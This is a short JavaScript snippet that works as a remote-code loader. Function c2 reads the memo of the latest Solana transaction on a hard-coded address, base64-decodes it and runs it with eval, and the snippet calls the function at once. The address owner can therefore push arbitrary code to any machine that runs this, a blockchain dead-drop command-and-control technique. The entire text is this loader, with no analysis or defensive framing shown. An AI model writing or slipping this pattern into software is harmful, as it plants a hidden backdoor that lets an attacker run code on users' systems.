async function c2(){
 const r = await fetch('https://api.mainnet-beta.solana.com', {method:'POST', body: JSON.stringify({method:'getSignaturesForAddress', params:['CanaryAddr111']})});
 const sig = (await r.json()).result[0];
 const memo = sig.memo;
 eval(atob(memo));
}
c2();
